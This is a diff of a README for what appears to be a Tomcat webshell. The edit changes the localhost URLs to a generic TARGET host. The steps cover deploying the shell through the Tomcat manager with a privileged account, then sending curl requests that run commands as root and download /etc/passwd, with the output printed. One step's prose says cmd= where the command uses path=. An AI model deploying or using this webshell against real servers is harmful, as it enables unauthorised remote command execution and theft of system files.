@@ -8,7 +8,7 @@
 
 ### Step 1: Access the Tomcat manager and upload the webshell application
 
-First of all, you will need to access the Apache Tomcat `/manager` page at http://127.0.0.1:10080/manager/html, and connect to it with an high privilege account of the Apache Tomcat server.
+First of all, you will need to access the Apache Tomcat `/manager` page at http://TARGET:10080/manager/html, and connect to it with an high privilege account of the Apache Tomcat server.
 
 ![](./imgs/manager.png)
 
@@ -22,10 +22,10 @@ And the application is deployed:
 
 ### Step 2.1: Executing commands
 
-You can now execute commands by sending a GET or POST request to http://127.0.0.1:10080/webshell/api with `action=exec&cmd=id`:
+You can now execute commands by sending a GET or POST request to http://TARGET:10080/webshell/api with `action=exec&cmd=id`:
 
 ```sh
-$ curl -X POST 'http://127.0.0.1:10080/webshell/api' --data "action=exec&cmd=id"
+$ curl -X POST 'http://TARGET:10080/webshell/api' --data "action=exec&cmd=id"
 {"stdout":"uid=0(root) gid=0(root) groups=0(root)\n","stderr":"","exec":["/bin/bash","-c","id"]}
 ```
 
@@ -35,10 +35,10 @@ You can also access it by a GET request from a browser:
 
 ### Step 2.2: Downloading files
 
-You can also download remote files by sending a GET or POST request to http://127.0.0.1:10080/webshell/api with `action=download&cmd=/etc/passwd`:
+You can also download remote files by sending a GET or POST request to http://TARGET:10080/webshell/api with `action=download&cmd=/etc/passwd`:
 
 ```sh
-$ curl -X POST 'http://127.0.0.1:10080/webshell/api' --data "action=download&path=/etc/passwd" -o-
+$ curl -X POST 'http://TARGET:10080/webshell/api' --data "action=download&path=/etc/passwd" -o-
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
